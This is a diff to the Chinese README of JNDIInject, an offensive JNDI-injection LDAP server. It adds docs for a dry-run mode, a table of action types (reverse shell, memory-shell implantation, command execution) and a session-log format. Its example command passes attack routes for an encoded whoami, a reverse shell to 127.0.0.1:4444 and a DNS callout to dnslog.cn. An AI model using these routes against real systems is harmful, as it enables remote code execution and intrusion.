@@ -20,6 +20,8 @@ Usage: java -jar JNDIInject-1.2-SNAPSHOT.jar [options]
     -l, --ldapPort Ldap bind port (default: 1389)
     -p, --httpPort Http bind port (default: 8080)
     -u, --usage    Show ALL usage (default: false)
+    -d, --dry-run  Dry run mode: validate routes without starting server (default: false)
+    --test-routes  Test routes (comma separated, for dry-run)
     -h, --help     Show this help
 ```
 **使用`java -jar JNDIInject.jar -u`查看全部完整的支持的 LDAP 格式以及爆破的字典**
@@ -354,6 +356,53 @@ x-client-data:godzilla
 
 
 
+
+# 验证流程
+
+## Dry-Run 模式
+
+在启动服务前验证路径解析是否正确：
+
+```shell
+java -jar JNDIInject-1.2-SNAPSHOT.jar -d
+```
+
+使用自定义测试路由：
+
+```shell
+java -jar JNDIInject-1.2-SNAPSHOT.jar -d --test-routes "basic/base64/d2hvYW1p,EL/reverseshell/127.0.0.1/4444,URLDNS/dnslog.cn"
+```
+
+## 动作分类
+
+工具会自动分类每个请求的动作类型：
+
+| 动作类型 | 说明 | 风险等级 |
+|---------|------|---------|
+| dns-probe | 出网验证 | 低 |
+| remote-class-load | 远程 class 加载 | 中 |
+| serialized-gadget | 序列化 gadget | 高 |
+| command | 命令执行 | 高 |
+| reverse-shell | 反弹 shell | 严重 |
+| memshell | 内存马植入 | 严重 |
+
+## 验证会话日志
+
+工具运行时会记录每个 LDAP 请求的详细信息：
+
+```
+[SESSION a1b2c3d4] 2026-06-16T09:00:00Z | 192.168.1.100 | LDAP | EL | reverseshell | action=reverse-shell | risk=严重 | SUCCESS
+```
+
+日志包含：
+- 会话 ID
+- 时间戳
+- 来源 IP
+- Payload 类型
+- 方法
+- 动作类型
+- 风险等级
+- 执行结果
 
 # 总结
 
